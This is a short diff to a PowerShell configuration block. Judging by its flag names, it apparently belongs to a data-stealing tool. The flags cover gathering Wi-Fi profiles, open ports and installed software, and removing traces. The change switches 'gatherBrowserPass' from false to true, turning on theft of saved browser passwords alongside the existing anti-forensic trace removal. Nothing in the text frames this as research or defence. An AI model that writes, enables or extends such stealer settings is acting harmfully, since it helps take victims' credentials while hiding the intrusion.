@@ -33,7 +33,7 @@ $features = @{
     "gatherWifiProfiles" = $true
     "gatherOpenPorts" = $true
     "executeExe" = $false
-    "gatherBrowserPass" = $false
+    "gatherBrowserPass" = $true
     "gatherInstalledSoftware" = $true
     "removeTraces" = $true
 }
